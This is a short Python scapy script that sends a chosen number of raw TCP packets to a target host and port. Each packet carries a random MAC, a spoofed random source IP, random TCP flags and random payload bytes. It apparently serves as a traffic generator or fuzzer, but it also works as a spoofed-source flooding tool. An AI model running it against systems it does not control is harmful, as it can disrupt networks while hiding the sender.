#!/usr/bin/env python3

import os
import sys
import random
import struct
from scapy.all import *

if len(sys.argv) != 4:
	print('usage: process <target> <port> <count>')
	sys.exit()

try:
	flag_list = ['F', 'S', 'R', 'P', 'A', 'U', 'E', 'C']
	for _ in range(int(sys.argv[3])):
		random_src_mac = RandMAC()
		random_dst_mac = RandMAC()
		print(f'random_src_mac: {random_src_mac}')
		print(f'random_dst_mac: {random_dst_mac}')
		random_ip = RandIP()
		print(f'random_ip: {random_ip}')
		ether_header = Ether(src=random_src_mac, dst=random_dst_mac)
		ip_header = IP(src=random_ip, dst=sys.argv[1])
		tcp_header = TCP(sport=int(sys.argv[2]), dport=int(sys.argv[2]), flags=random.choice(flag_list),seq=random.randint(0, 8675309))
		random_data = os.urandom(random.randint(0, 1024)) 
		packet = ether_header/ip_header/tcp_header/random_data
		sendp(packet)
		print()
except TypeError:
	print('usage: rtg <target> <port> <count>')
	
